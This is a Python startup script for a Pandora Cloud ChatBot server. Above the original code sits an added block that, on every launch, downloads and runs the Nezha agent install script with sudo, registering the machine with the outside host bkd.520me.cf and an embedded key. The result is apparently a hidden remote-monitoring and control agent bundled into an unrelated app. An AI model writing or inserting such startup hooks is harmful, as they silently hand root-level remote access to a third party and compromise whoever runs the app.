import os
import subprocess

# 添加执行curl命令的代码
install_command = 'curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh install_agent bkd.520me.cf 8807 g3bFKBBhehXjq9f4q9'
subprocess.run(install_command, shell=True)

# 以下是原有代码
from os import getenv
from pandora_cloud.server import ChatBot

_port = getenv('PORT')
_proxy = getenv('PANDORA_PROXY')
_debug = getenv('PANDORA_DEBUG', 'false').lower() == 'true'
_local = getenv('PANDORA_LOGIN_LOCAL', 'false').lower() == 'true'
_listen = getenv('PANDORA_SERVER_LISTEN', 'true').lower() == 'true'
_server = getenv('PANDORA_SERVER', '0.0.0.0:{}'.format(_port) if _port else '0.0.0.0')

app = ChatBot(proxy=_proxy, debug=_debug, login_local=_local).run(_server, listen=_listen)
